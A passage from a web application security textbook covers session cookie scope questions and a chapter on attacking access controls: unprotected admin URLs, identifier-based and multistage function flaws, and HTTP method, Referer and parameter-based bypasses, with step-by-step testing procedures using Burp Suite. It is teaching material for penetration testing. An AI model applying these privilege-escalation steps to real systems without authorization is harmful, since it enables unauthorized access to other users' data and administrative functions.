the following cookie:\nSet-cookie: sessionId=1498172056438227; domain=foo.wahh-\napp.com; path=/login; HttpOnly;\nYou then visit a range of other URLs. To which of the following will your\nbrowser submit the sessionId cookie? (Select all that apply.)\n(a) https://foo.wahh-app.com/login/myaccount.php\n(b) https://bar.wahh-app.com/login\n(c) https://staging.foo.wahh-app.com/login/home.php\n(d) http://foo.wahh-app.com/login/myaccount.php\ncc0077..iinndddd 225555 88//1199//22001111 1122::0077::4455 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 256\n256 Chapter 7 n Attacking Session Management\n(e) http://foo.wahh-app.com/logintest/login.php\n(f) https://foo.wahh-app.com/logout\n(g) https://wahh-app.com/login/\n(h) https://xfoo.wahh-app.com/login/myaccount.php\n4. The application you are targeting uses per-page tokens in addition to the\nprimary session token. If a per-page token is received out of sequence, the\nentire session is invalidated. Suppose that you discover some defect that\nenables you to predict or capture the tokens issued to other users who are\ncurrently accessing the application. Can you hijack their sessions?\n5. You log in to an application, and the server sets the following cookie:\nSet-cookie: sess=ab11298f7eg14;\nWhen you click the logout button, this causes the following client-side\nscript to execute:\ndocument.cookie=”sess=”;\ndocument.location=”/”;\nWhat conclusion would you draw from this behavior?\ncc0077..iinndddd 225566 88//1199//22001111 1122::0077::4455 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 257\n\nCHAPTER\n8\nAttacking Access Controls\nWithin the application’s core security mechanisms, access controls are logically\nbuilt on authentication and session management. So far, you have seen how an\napplication can fi rst verify a user’s identity and then confi rm that a particular\nsequence of requests that it receives originated from the same user. The primary\nreason that the application needs to do these things — in terms of security, at\nleast — is because it needs a way to decide whether it should permit a given\nrequest to perform its attempted action or access the resources it is requesting.\nAccess controls are a critical defense mechanism within the application because\nthey are responsible for making these key decisions. When they are defective, an\nattacker can often compromise the entire application, taking control of adminis-\ntrative functionality and accessing sensitive data belonging to every other user.\nAs noted in Chapter 1, broken access controls are among the most commonly\nencountered categories of web application vulnerability, affecting a massive 71\npercent of the applications recently tested by the authors. It is extremely com-\nmon to encounter applications that go to all the trouble of implementing robust\nmechanisms for authentication and session management, only to squander that\ninvestment by neglecting to build effective access controls on them. One reason\nthat these weaknesses are so prevalent is that access control checks need to be\nperformed for every request and every operation on a resource that particular\nuser attempts to perform, at a specifi c time. And unlike many other classes of\ncontrol, this is a design decision that needs to be made by a human; it cannot\nbe resolved by employing technology.\n257\ncc0088..iinndddd 225577 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 258\n258 Chapter 8 n Attacking Access Controls\nAccess control vulnerabilities are conceptually simple: The application lets you\ndo something you shouldn’t be able to. The differences between separate fl aws\nreally come down to the different ways in which this core defect is manifested and\nthe different techniques you need to employ to detect it. This chapter describes all\nthese techniques, showing how you can exploit different kinds of behavior within\nan application to perform unauthorized actions and access protected data.\nCommon Vulnerabilities\nAccess controls can be divided into three broad categories: vertical, horizontal,\nand context-dependent.\nVertical access controls allow different types of users to access different parts\nof the application’s functionality. In the simplest case, this typically involves a\ndivision between ordinary users and administrators. In more complex cases,\nvertical access controls may involve fi ne-grained user roles granting access to\nspecifi c functions, with each user being allocated to a single role, or a combina-\ntion of different roles.\nHorizontal access controls allow users to access a certain subset of a wider\nrange of resources of the same type. For example, a web mail application may\nallow you to read your e-mail but no one else’s, an online bank may let you\ntransfer money out of your account only, and a workfl ow application may allow\nyou to update tasks assigned to you but only read tasks assigned to other people.\nContext-dependent access controls ensure that users’ access is restricted to\nwhat is permitted given the current application state. For example, if a user is\nfollowing multiple stages within a process, context-dependent access controls\nmay prevent the user from accessing stages out of the prescribed order.\nIn many cases, vertical and horizontal access controls are intertwined. For\nexample, an enterprise resource planning application may allow each accounts\npayable clerk to pay invoices for a specifi c organizational unit and no other. The\naccounts payable manager, on the other hand, may be allowed to pay invoices\nfor any unit. Similarly, clerks may be able to pay invoices for small amounts,\nbut larger invoices must be paid by the manager. The fi nance director may be\nable to view invoice payments and receipts for every organizational unit in the\ncompany but may not be permitted to pay any invoices.\nAccess controls are broken if any user can access functionality or resources for\nwhich he or she is not authorized. There are three main types of attacks against\naccess controls, corresponding to the three categories of controls:\nn Vertical privilege escalation occurs when a user can perform functions\nthat his assigned role does not permit him to. For example, if an ordinary\nuser can perform administrative functions, or a clerk can pay invoices of\nany size, access controls are broken.\ncc0088..iinndddd 225588 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 259\nChapter 8 n Attacking Access Controls 259\nn Horizontal privilege escalation occurs when a user can view or modify\nresources to which he is not entitled. For example, if you can use a web\nmail application to read other people’s e-mail, or if a payment clerk can\nprocess invoices for an organizational unit other than his own, access\ncontrols are broken.\nn Business logic exploitation occurs when a user can exploit a fl aw in the\napplication’s state machine to gain access to a key resource. For example,\na user may be able to bypass the payment step in a shopping checkout\nsequence.\nIt is common to fi nd cases where vulnerability in the application’s horizontal\nseparation of privileges can lead immediately to a vertical escalation attack. For\nexample, if a user fi nds a way to set a different user’s password, the user can\nattack an administrative account and take control of the application.\nIn the cases described so far, broken access controls enable users who have\nauthenticated themselves to the application in a particular user context to per-\nform actions or access data for which that context does not authorize them.\nHowever, in the most serious cases of broken access control, it may be possible\nfor completely unauthorized users to gain access to functionality or data that\nis intended to be accessed only by privileged authenticated users.\nCompletely Unprotected Functionality\nIn many cases of broken access controls, sensitive functionality and resources\ncan be accessed by anyone who knows the relevant URL. For example, with\nmany applications, anyone who visits a specifi c URL can make full use of its\nadministrative functions:\nhttps://wahh-app.com/admin/\nIn this situation, the application typically enforces access control only to the\nfollowing extent: users who have logged in as administrators see a link to this\nURL on their user interface, and other users do not. This cosmetic difference\nis the only mechanism in place to “protect” the sensitive functionality from\nunauthorized use.\nSometimes, the URL that grants access to powerful functions may be less\neasy to guess, and may even be quite cryptic:\nhttps://wahh-app.com/menus/secure/ff457/DoAdminMenu2.jsp\nHere, access to administrative functions is protected by the assumption that\nan attacker will not know or discover this URL. The application is harder for\nan outsider to compromise, because he is less likely to guess the URL by which\nhe can do so.\ncc0088..iinndddd 225599 88//1199//22001111 1122::0088::3311 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 260\n260 Chapter 8 n Attacking Access Controls\n\nCOMMON MYTH\n“No low-privileged users will know that URL. We don’t reference it anywhere\nwithin the application.”\nThe absence of any genuine access control still constitutes a serious vulner-\nability, regardless of how easy it would be to guess the URL. URLs do not have\nthe status of secrets, either within the application itself or in the hands of\nits users. They are displayed on-screen, and they appear in browser histories\nand the logs of web servers and proxy servers. Users may write them down,\nbookmark them, or e-mail them. They are not usually changed periodically, as\npasswords should be. When users change job roles, and their access to admin-\nistrative functionality needs to be withdrawn, there is no way to delete their\nknowledge of a particular URL.\nIn some applications where sensitive functionality is hidden behind URLs\nthat are not easy to guess, an attacker may often be able to identify these via\nclose inspection of client-side code. Many applications use JavaScript to build\nthe user interface dynamically within the client. This typically works by setting\nvarious fl ags regarding the user’s status and then adding individual elements\nto the UI on the basis of these:\nvar isAdmin = false;\n...\nif (isAdmin)\n{\nadminMenu.addItem(“/menus/secure/ff457/addNewPortalUser2.jsp”,\n“create a new user”);\n}\nHere, an attacker can simply review the JavaScript to identify URLs for\nadministrative functionality and attempt to access these. In other cases, HTML\ncomments may contain references to or clues about URLs that are not linked\nfrom on-screen content. Chapter 4 discusses the various techniques by which\nan attacker can gather information about hidden content within the application.\nDirect Access to Methods\nA specifi c case of unprotected functionality can arise when applications expose\nURLs or parameters that are actually remote invocations of API methods, normally\nthose exposed by a Java interface. This often occurs when server-side code is\nmoved to a browser extension component and method stubs are created so that\nthe code can still call the server-side methods it requires to function. Outside\nof this situation, some instances of direct access to methods can be identifi ed\nwhere URLs or parameters use the standard Java naming conventions, such as\ngetBalance and isExpired.\ncc0088..iinndddd 226600 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 261\nChapter 8 n Attacking Access Controls 261\nIn principle, requests specifying a server-side API to be executed need be\nno less secure than those specifying a server-side script or other resource. In\npractice, however, this type of mechanism frequently contains vulnerabilities.\nOften, the client interacts directly with server-side API methods and bypasses\nthe application’s normal controls over access or unexpected input vectors. There\nis also a chance that other functionality exists that can be invoked in this way\nand is not protected by any controls, on the assumption that it could never be\ndirectly invoked by web application clients. Often, there is a need to provide\nusers with access to certain specifi c methods, but they are instead given access\nto all methods. This is either because the developer is not fully aware of which\nsubset of methods to proxy and provides access to all methods, or because the API\nused to map them to the HTTP server provides access to all methods by default.\nThe following example shows the getCurrentUserRoles method being invoked\nfrom within the interface securityCheck:\nhttp://wahh-app.com/public/securityCheck/getCurrentUserRoles\nIn this example, in addition to testing the access controls over the getCur-\nrentUserRoles method, you should check for the existence of other similarly\nnamed methods such as getAllUserRoles, getAllRoles, getAllUsers, and\ngetCurrentUserPermissions. Further considerations specifi c to the testing of\ndirect access to methods are described later in this chapter.\nIdentifi er-Based Functions\nWhen a function of an application is used to gain access to a specifi c resource,\nit is common to see an identifi er for the requested resource being passed to the\nserver in a request parameter, within either the URL query string or the body\nof a POST request. For example, an application may use the following URL to\ndisplay a specifi c document belonging to a particular user:\nhttps://wahh-app.com/ViewDocument.php?docid=1280149120\nWhen the user who owns the document is logged in, a link to this URL is\ndisplayed on the user’s My Documents page. Other users do not see the link.\nHowever, if access controls are broken, any user who requests the relevant URL\nmay be able to view the document in exactly the same way as the authorized user.\nTIP This type of vulnerability often arises when the main application inter-\nfaces with an external system or back-end component. It can be diffi cult to\nshare a session-based security model between different systems that may be\nbased on diverse technologies. Faced with this problem, developers frequently\ntake a shortcut and move away from that model, using client-submitted\nparameters to make access control decisions.\ncc0088..iinndddd 226611 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 262\n262 Chapter 8 n Attacking Access Controls\nIn this example, an attacker seeking to gain unauthorized access needs to\nknow not only the name of the application page (ViewDocument.php) but also\nthe identifi er of the document he wants to view. Sometimes, resource identi-\nfi ers are generated in a highly unpredictable manner; for example, they may\nbe randomly chosen GUIDs. In other cases, they may be easily guessed; for\nexample, they may be sequentially generated numbers. However, the applica-\ntion is vulnerable in both cases. As described previously, URLs do not have the\nstatus of secrets, and the same applies to resource identifi ers. Often, an attacker\nwho wants to discover the identifi ers of other users’ resources can fi nd some\nlocation within the application that discloses these, such as access logs. Even\nwhere an application’s resource identifi ers cannot be easily guessed, the appli-\ncation is still vulnerable if it fails to properly control access to those resources.\nIn cases where the identifi ers are easily predicted, the problem is even more\nserious and more easily exploited.\nTIP Application logs are often a gold mine of information. They may contain\nnumerous items of data that can be used as identifi ers to probe functionality\nthat is accessed in this way. Identifi ers commonly found within application\nlogs include usernames, user ID numbers, account numbers, document IDs,\nuser groups and roles, and e-mail addresses.\nNOTE In addition to being used as references to data-based resources within\nthe application, this kind of identifi er is often used to refer to functions of the\napplication itself. As you saw in Chapter 4, an application may deliver differ-\nent functions via a single page, which accepts a function name or identifi er as\na parameter. Again in this situation, access controls may run no deeper than\nthe presence or absence of specifi c URLs within the interfaces of different\ntypes of users. If an attacker can determine the identifi er for a sensitive func-\ntion, he may be able to access it in the same way as a more privileged user.\nMultistage Functions\nMany kinds of functions within an application are implemented across several\nstages, involving multiple requests being sent from the client to the server. For\nexample, a function to add a new user may involve choosing this option from\na user maintenance menu, selecting the department and user role from drop-\ndown lists, and then entering the new username, initial password, and other\ninformation.\nIt is common to encounter applications in which efforts have been made to\nprotect this kind of sensitive functionality from unauthorized access but where\nthe access controls employed are broken because of fl awed assumptions about\nhow the functionality will be used.\ncc0088..iinndddd 226622 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 263\nChapter 8 n Attacking Access Controls 263\nIn the previous example, when a user attempts to load the user maintenance\nmenu and chooses the option to add a new user, the application may verify\nthat the user has the required privileges and block access if the user does not.\nHowever, if an attacker proceeds directly to the stage of specifying the user’s\ndepartment and other details, there may be no effective access control. The\ndevelopers unconsciously assumed that any user who reaches the later stages\nof the process must have the relevant privileges because this was verifi ed at\nthe earlier stages. The result is that any user of the application can add a new\nadministrative user account and thereby take full control of the application, gain-\ning access to many other functions whose access control is intrinsically robust.\nThe authors have encountered this type of vulnerability even in the most\nsecurity-critical web applications — those deployed by online banks. Making a\nfunds transfer in a banking application typically involves multiple stages, partly\nto prevent users from accidentally making mistakes when requesting a transfer.\nThis multistage process involves capturing different items of data from the user\nat each stage. This data is checked thoroughly when fi rst submitted and then\nusually is passed to each subsequent stage, using hidden fi elds in HTML form.\nHowever, if the application does not revalidate all this data at the fi nal stage,\nan attacker can potentially bypass the server’s checks. For example, the appli-\ncation might verify that the source account selected for the transfer belongs to\nthe current user and then ask for details about the destination account and the\namount of the transfer. If a user intercepts the fi nal POST request of this process\nand modifi es the source account number, she can execute a horizontal privilege\nescalation and transfer funds out of an account belonging to a different user.\nStatic Files\nIn the majority of cases, users gain access to protected functionality and resources\nby issuing requests to dynamic pages that execute on the server. It is the responsi-\nbility of each such page to perform suitable access control checks and confi rm that\nthe user has the relevant privileges to perform the action he or she is attempting.\nHowever, in some cases, requests for protected resources are made directly to\nthe static resources themselves, which are located within the server’s web root.\nFor example, an online publisher may allow users to browse its book catalog\nand purchase ebooks for download. Once payment has been made, the user is\ndirected to a download URL like the following:\nhttps://wahh-books.com/download/9780636628104.pdf\nBecause this is a completely static resource, if it is hosted on a traditional web\nserver, its contents are simply returned directly by the server, and no application-\nlevel code is executed. Hence, the resource cannot implement any logic to verify\ncc0088..iinndddd 226633 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 264\n264 Chapter 8 n Attacking Access Controls\nthat the requesting user has the required privileges. When static resources are\naccessed in this way, it is highly likely that no effective access controls are pro-\ntecting them and that anyone who knows the URL naming scheme can exploit\nthis to access any resources he wants. In the present case, the document name\nlooks suspiciously like an ISBN, which would enable an attacker to quickly\ndownload every ebook produced by the publisher!\nCertain types of functionality are particularly prone to this kind of prob-\nlem, including fi nancial websites providing access to static documents about\ncompanies such as annual reports, software vendors that provide downloadable\nbinaries, and administrative functionality that provides access to static log fi les\nand other sensitive data collected within the application.\nPlatform Misconfi guration\nSome applications use controls at the web server or application platform layer\nto control access. Typically, access to specifi ed URL paths is restricted based on\nthe user’s role within the application. For example, access to the /admin path\nmay be denied to users who are not in the Administrators group. In principle,\nthis is an entirely legitimate means of controlling access. However, mistakes\nmade in the confi guration of the platform-level controls can often allow unau-\nthorized access to occur.\nThe platform-level confi guration normally takes the form of rules that are\nakin to fi rewall policy rules, which allow or deny access based on the following:\nn HTTP request method\nn URL path\nn User role\nAs described in Chapter 3, the original purpose of the GET method is of retriev-\ning information, and the purpose of the POST method is performing actions that\nchange the application’s data or state.\nIf care is not taken to devise rules that accurately allow access based on the\ncorrect HTTP methods and URL paths, this may lead to unauthorized access.\nFor example, if an administrative function to create a new user uses the POST\nmethod, the platform may have a deny rule that disallows the POST method\nand allows all other methods. However, if the application-level code does not\nverify that all requests for this function are in fact using the POST method, an\nattacker may be able to circumvent the control by submitting the same request\nusing the GET method. Since most application-level APIs for retrieving request\nparameters are agnostic as to the request method, the attacker can simply sup-\nply the required parameters within the URL query string of the GET request to\nmake unauthorized use of the function.\ncc0088..iinndddd 226644 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 265\nChapter 8 n Attacking Access Controls 265\nWhat is more surprising, on the face of it, is that applications can still be\nvulnerable even if the platform-level rule denies access to both the GET and\nPOST methods. This happens because requests using other HTTP methods may\nultimately be handled by the same application code that handles GET and POST\nrequests. One example of this is the HEAD method. According to specifi cations,\nservers should respond to a HEAD request with the same headers they would use\nto respond to the corresponding GET request, but with no message body. Hence,\nmost platforms correctly service HEAD requests by executing the corresponding\nGET handler and just return the HTTP headers that are generated. GET requests\ncan often be used to perform sensitive actions, either because the application\nitself uses GET requests for this purpose (contrary to specifi cations) or because\nit does not verify that the POST method is being used. If an attacker can use a\nHEAD request to add an administrative user account, he or she can live without\nreceiving any message body in the response.\nIn some cases, platforms handle requests that use unrecognized HTTP methods\nby simply passing them to the GET request handler. In this situation, platform-\nlevel controls that just deny certain specifi ed HTTP methods can be bypassed\nby specifying an arbitrary invalid HTTP method in the request.\nChapter 18 contains a specifi c example of this type of vulnerability arising\nin a web application platform product.\nInsecure Access Control Methods\nSome applications employ a fundamentally insecure access control model in\nwhich access control decisions are made on the basis of request parameters\nsubmitted by the client, or other conditions that are within an attacker’s control.\nParameter-Based Access Control\nIn some versions of this model, the application determines a user’s role or access\nlevel at the time of login and from this point onward transmits this information\nvia the client in a hidden form fi eld, cookie, or preset query string parameter (see\nChapter 5). When each subsequent request is processed, the application reads\nthis request parameter and decides what access to grant the user accordingly.\nFor example, an administrator using the application may see URLs like the\nfollowing:\nhttps://wahh-app.com/login/home.jsp?admin=true\nThe URLs seen by ordinary users contain a different parameter, or none at all.\nAny user who is aware of the parameter assigned to administrators can simply\nset it in his own requests and thereby gain access to administrative functions.\ncc0088..iinndddd 226655 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 266\n266 Chapter 8 n Attacking Access Controls\nThis type of access control may sometimes be diffi cult to detect without\nactually using the application as a high-privileged user and identifying what\nrequests are made. The techniques described in Chapter 4 for discovering hid-\nden request parameters may be successful in discovering the mechanism when\nworking only as an ordinary user.\nReferer-Based Access Control\nIn other unsafe access control models, the application uses the HTTP Referer\nheader as the basis for making access control decisions. For example, an appli-\ncation may strictly control access to the main administrative menu based on\na user’s privileges. But when a user makes a request for an individual admin-\nistrative function, the application may simply check whether this request was\nreferred from the administrative menu page. It might assume that the user must\nhave accessed that page and therefore has the required privileges. This model\nis fundamentally broken, of course, because the Referer header is completely\nunder the user’s control and can be set to any value.\nLocation-Based Access Control\nMany businesses have a regulatory or business requirement to restrict access to\nresources depending on the user’s geographic location. These are not limited\nto the fi nancial sector but include news services and others. In these situations,\na company may employ various methods to locate the user, the most common\nof which is geolocation of the user’s current IP address.\nLocation-based access controls are relatively easy for an attacker to circum-\nvent. Here are some common methods of bypassing them:\nn Using a web proxy that is based in the required location\nn Using a VPN that terminates in the required location\nn Using a mobile device that supports data roaming\nn Direct manipulation of client-side mechanisms for geolocation\nAttacking Access Controls\nBefore starting to probe the application to detect any actual access control\nvulnerabilities, you should take a moment to review the results of your appli-\ncation mapping exercises (see Chapter 4). You need to understand what the\napplication’s actual requirements are in terms of access control, and therefore\nwhere it will probably be most fruitful to focus your attention.\ncc0088..iinndddd 226666 88//1199//22001111 1122::0088::3311 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 267\nChapter 8 n Attacking Access Controls 267\n\nHACK STEPS\nHere are some questions to consider when examining an application’s access\ncontrols:\n1. Do application functions give individual users access to a particular\nsubset of data that belongs to them?\n2. Are there different levels of user, such as managers, supervisors, guests,\nand so on, who are granted access to different functions?\n3. Do administrators use functionality that is built into the same application\nto configure and monitor it?\n4. What functions or data resources within the application have you identi-\nfied that would most likely enable you to escalate your current privileges?\n5. Are there any identifiers (by way of URL parameters of POST body mes-\nsage) that signal a parameter is being used to track access levels?\nTesting with Different User Accounts\nThe easiest and most effective way to test the effectiveness of an application’s\naccess controls is to access the application using different accounts. That way\nyou can determine whether resources and functionality that can be accessed\nlegitimately by one account can be accessed illegitimately by another.\n\nHACK STEPS\n1. If the application segregates user access to different levels of functional-\nity, first use a powerful account to locate all the available functionality.\nThen attempt to access this using a lower-privileged account to test for\nvertical privilege escalation.\n2. If the application segregates user access to different resources (such as\ndocuments), use two different user-level accounts to test whether access\ncontrols are effective or whether horizontal privilege escalation is pos-\nsible. For example, find a document that can be legitimately accessed by\none user but not by another, and attempt to access it using the second\nuser’s account — either by requesting the relevant URL or by submitting\nthe same POST parameters from within the second user’s session.\nTesting an application’s access controls thoroughly is a time-consuming\nprocess. Fortunately, some tools can help you automate some of the work involved,\nto make your testing quicker and more reliable. This will allow you to focus\non the parts of the task that require human intelligence to perform effectively.\ncc0088..iinndddd 226677 88//1199//22001111 1122::0088::3322 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 268\n268 Chapter 8 n Attacking Access Controls\nBurp Suite lets you map the contents of an application using two different\nuser contexts. Then you can compare the results to see exactly where the content\naccessed by each user is the same or different.\n\nHACK STEPS\n1. With Burp configured as your proxy and interception disabled, browse all\nthe application’s content within one user context. If you are testing verti-\ncal access controls, use the higher-privilege account for this.\n2. Review the contents of Burp’s site map to ensure that you have identified\nall the functionality you want to test. Then use the context menu to select\nthe “compare site maps” feature.\n3. To select the second site map to be compared, you can either load this\nfrom a Burp state file or have Burp dynamically rerequest the first site\nmap in a new session context. To test horizontal access controls between\nusers of the same type, you can simply load a state file you saved earlier,\nhaving mapped the application as a different user. For testing vertical\naccess controls, it is preferable to rerequest the high-privilege site map as\na low-privileged user, because this ensures complete coverage of the\nrelevant functionality.\n4. To rerequest the first site map in a different session, you need to configure\nBurp’s session-handling functionality with the details of the low-privilege\nuser session (for example, by recording a login macro or providing a\nspecific cookie to be used in requests). This feature is described in more\ndetail in Chapter 14. You may also need to define suitable scope rules to\nprevent Burp from requesting any logout function.\nFigure 8-1 shows the results of a simple site map comparison. Its colorized\nanalysis of the differences between the site maps shows items that have been\nadded, removed, or modifi ed between the two maps. For modifi ed items, the\ntable includes a “diff count” column, which is the number of edits required to\nmodify the item in the fi rst map into the item in the second map. Also, when an\nitem is selected, the responses are also colorized to show the locations of those\nedits within the responses.\nInterpreting the results of the site map comparison requires human intelli-\ngence and an understanding of the meaning and context of specifi c application\nfunctions. For example, Figure 8-1 shows the responses that are returned to\neach user when they view their home page. The two responses show a different\ndescription of the logged-in user, and the administrative user has an additional\nmenu item. These differences are to be expected, and they are neutral as to the\neffectiveness of the application’s access controls, since they concern only\nthe user interface.\ncc0088..iinndddd 226688 88//1199//22001111 1122::0088::3322 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 269\nChapter 8 n Attacking Access Controls 269\nFigure 8-1: A site map comparison showing the differences between content that\nwas accessed in different user contexts\nFigure 8-2 shows the response returned when each user requests the top-level\nadmin page. Here, the administrative user sees a menu of available options, while\nthe ordinary user sees a “not authorized” message. These differences indicate\nthat access controls are being applied correctly. Figure 8-3 shows the response\nreturned when each user requests the “list users” admin function. Here, the\nresponses are identical, indicating that the application is vulnerable, since the\nordinary user should not have access to this function and does not have any\nlink to it in his or her user interface.\nSimply exploring the site map tree and looking at the number of differences\nbetween items is insuffi cient to evaluate the effectiveness of the application’s\naccess controls. Two identical responses may indicate a vulnerability (for example,\nin an administrative function that discloses sensitive information) or may be\nharmless (for example, in an unprotected search function). Conversely, two dif-\nferent responses may still mean that a vulnerability exists (for example, in an\nadministrative function that returns different content each time it is accessed)\nor may be harmless (for example, in a page showing profi le information about\nthe currently logged-in user). For these reasons, fully automated tools gener-\nally are ineffective at identifying access control vulnerabilities. Using Burp’s\nfunctionality to compare site maps, you can automate as much of the process\nas possible, giving you all the information you need in a ready form, and let-\nting you apply your knowledge of the application’s functionality to identify any\nactual vulnerabilities.\ncc0088..iinndddd 226699 88//1199//22001111 1122::0088::3322 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 270\n270 Chapter 8 n Attacking Access Controls\nFigure 8-2: The low-privileged user is denied access to the top-level admin page\nFigure 8-3: The low-privileged user can access the administrative function to list\napplication users\ncc0088..iinndddd 227700 88//1199//22001111 1122::0088::3322 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 271\nChapter 8 n Attacking Access Controls 271\nTRY IT!\nhttp://mdsec.net/auth/462/\nhttp://mdsec.net/auth/468/\nTesting Multistage Processes\nThe approach described in the preceding section — comparing the appli-\ncation’s contents when accessed in different user contexts — is ineffective\nwhen testing some multistage processes. Here, to perform an action, the\nuser typically must make several requests in the correct sequence, with the\napplication building some state about the user’s actions as he or she does so.\nSimply rerequesting each of the items in a site map may fail to replicate the\nprocess correctly, so the attempted action may fail for reasons other than\nthe use of access controls.\nFor example, consider an administrative function to add a new application\nuser. This may involve several steps, including loading the form to add a user,\nsubmitting the form with details of the new user, reviewing these details, and\nconfi rming the action. In some cases, the application may protect access to the\ninitial form but fail to protect the page that handles the form submission or\nthe confi rmation page. The overall process may involve numerous requests,\nincluding redirections, with parameters submitted at earlier stages being\nretransmitted later via the client side. Every step of this process needs to\nbe tested individually, to confi rm whether access controls are being applied\ncorrectly.\nTRY IT!\nhttp://mdsec.net/auth/471/\n\nHACK STEPS\n1. When an action is carried out in a multistep way, involving several different\nrequests from client to server, test each request individually to determine\nwhether access controls have been applied to it. Be sure to include every\nrequest, including form submissions, the following of redirections, and any\nunparameterized requests.\n2. Try to find any locations where the application effectively assumes that if\nyou have reached a particular point, you must have arrived via legitimate\nmeans. Try to reach that point in other ways using a lower-privileged\naccount to detect if any privilege escalation attacks are possible.\nContinued\ncc0088..iinndddd 227711 88//1199//22001111 1122::0088::3333 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 272\n272 Chapter 8 n Attacking Access Controls\nHACK STEPS (CONTINUED)\n3. One way to perform this testing manually is to walk through a protected\nmultistage process several times in your browser and use your proxy to\nswitch the session token supplied in different requests to that of a\nless-privileged user.\n4. You can often dramatically speed up this process by using the “request in\nbrowser” feature of Burp Suite:\na. Use the higher-privileged account to walk through the entire multi-\nstage process.\nb. Log in to the application using the lower-privileged account (or none\nat all).\nc. In the Burp Proxy history, find the sequence of requests that were\nmade when the multistage process was performed as a more privi-\nleged user. For each request in the sequence, select the context menu\nitem “request in browser in current browser session,” as shown in\nFigure 8-4. Paste the provided URL into your browser that is logged in\nas the lower-privileged user.\nd. If the application lets you, follow through the remainder of the\nmulti-stage process in the normal way, using your browser.\ne. View the result within both the browser and the proxy history to\ndetermine whether it successfully performed the privileged action.\nFigure 8-4: Using Burp to request a given item within the current browser session\ncc0088..iinndddd 227722 88//1199//22001111 1122::0088::3333 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 273\nChapter 8 n Attacking Access Controls 273\nWhen you select Burp’s “request in browser in current browser session”\nfeature for a specifi ed request, Burp gives you a unique URL targeting Burp’s\ninternal web server, which you paste into your browser’s address bar. When\nyour browser requests this URL, Burp returns a redirection to the originally\nspecifi ed URL. When your browser follows the redirection, Burp replaces the\nrequest with the one you originally specifi ed, while leaving the Cookie header\nintact. If you are testing different user contexts, you can speed up this process.\nLog in to several different browsers as different users, and paste the URL into\neach browser to see how the request is handled for the user who is logged in\nusing that browser. (Note that because cookies generally are shared between\ndifferent windows of the same browser, you normally will need to use differ-\nent browser products, or browsers on different machines, to perform this test.)\nTIP When you are testing multistage processes in different user contexts, it\nis sometimes helpful to review the sequences of requests that are made by\ndifferent users side-by-side to identify subtle differences that may merit\nfurther investigation.\nIf you are using separate browsers to access the application as different users,\nyou can create a different proxy listener in Burp for use by each browser (you\nneed to update your proxy confi guration in each browser to point to the rel-\nevant listener). Then, for each browser, use the context menu on the proxy\nhistory to open a new history window, and set a display fi lter to show only\nrequests from the relevant proxy listener.\nTesting with Limited Access\nIf you have only one user-level account with which to access the application (or\nnone at all), additional work needs to be done to test the effectiveness of access\ncontrols. In fact, to perform a fully comprehensive test, further work needs to\nbe done in any case. Poorly protected functionality may exist that is not explic-\nitly linked from the interface of any application user. For example, perhaps old\nfunctionality has not yet been removed, or new functionality has been deployed\nbut has not yet been published to users.\n\nHACK STEPS\n1. Use the content discovery techniques described in Chapter 4 to identify\nas much of the application’s functionality as possible. Performing this\nexercise as a low-privileged user is often sufficient to both enumerate and\ngain direct access to sensitive functionality.\nContinued\ncc0088..iinndddd 227733 88//1199//22001111 1122::0088::3333 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 274\n274 Chapter 8 n Attacking Access Controls\nHACK STEPS (CONTINUED)\n2. Where application pages are identified that are likely to present dif-\nferent functionality or links to ordinary and administrative users (for\nexample, Control Panel or My Home Page), try adding parameters such\nasadmin=true to the URL query string and the body of POST requests.\nThis will help you determine whether this uncovers or gives access to any\nadditional functionality than your user context has normal access to.\n3. Test whether the application uses the Referer header as the basis for\nmaking access control decisions. For key application functions that you\nare authorized to access, try removing or modifying the Referer header,\nand determine whether your request is still successful. If not, the applica-\ntion may be trusting the Referer header in an unsafe way. If you scan\nrequests using Burp’s active scanner, Burp tries to remove the Referer\nheader from each request and informs you if this appears to make a sys-\ntematic and relevant difference to the application’s response.\n4. Review all client-side HTML and scripts to find references to hidden\nfunctionality or functionality that can be manipulated on the client side,\nsuch as script-based user interfaces. Also, decompile all browser exten-\nsion components as described in Chapter 5 to discover any references to\nserver-side functionality.\nTRY IT!\nhttp://mdsec.net/auth/477/\nhttp://mdsec.net/auth/472/\nhttp://mdsec.net/auth/466/\nWhen all accessible functionality has been enumerated, you need to test\nwhether per-user segregation of access to resources is being correctly enforced.\nIn every instance where the application grants users access to a subset of a wider\nrange of resources of the same type (such as documents, orders, e-mails, and\npersonal details), there may be opportunities for one user to gain unauthorized\naccess to other resources.\n\nHACK STEPS\n1. Where the application uses identifiers of any kind (document IDs, account\nnumbers, order references) to specify which resource a user is requesting,\nattempt to discover the identifiers for resources to which you do not have\nauthorized access.\ncc0088..iinndddd 227744 88//1199//22001111 1122::0088::3333 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 275\nChapter 8 n Attacking Access Controls 275\n2. If it is possible to generate a series of such identifiers in quick succes-\nsion (for example, by creating multiple new documents or orders), use the\ntechniques described in Chapter 7 for session tokens to try to discover\nany predictable sequences in the identifiers the application produces.\n3. If it is not possible to generate any new identifiers, you are restricted to\nanalyzing the identifiers you have already discovered, or even using plain\nguesswork. If the identifier has the form of a GUID, it is unlikely that any\nattempts based on guessing will be successful. However, if it is 